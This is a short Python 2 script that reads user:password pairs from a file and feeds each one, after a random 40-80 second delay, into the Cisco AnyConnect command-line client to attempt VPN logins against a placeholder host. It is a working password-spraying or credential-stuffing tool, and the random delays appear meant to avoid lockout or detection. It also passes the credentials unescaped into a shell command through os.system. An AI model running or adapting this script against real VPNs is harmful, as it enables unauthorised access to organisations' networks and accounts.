import os
import random
import time

users_file = "users.txt" #user:pass
binary_path = "/root/cisco_anyconnect/anyconnect-linux64-4.7.01076/vpn/vpn"
host = "x.x.x.x"
creds = open(users_file).read().splitlines()

for c in creds:
	print c
	splitted = str(c).split(":")
	user = splitted[0]
	password = splitted[1]
	rand = random.randint(40,80)
	time.sleep(rand)
	cmd_ = ("printf 'y\n"+user+"\n"+password+"\ny' | "+binary_path+" -s connect "+host)
	os.system(cmd_)
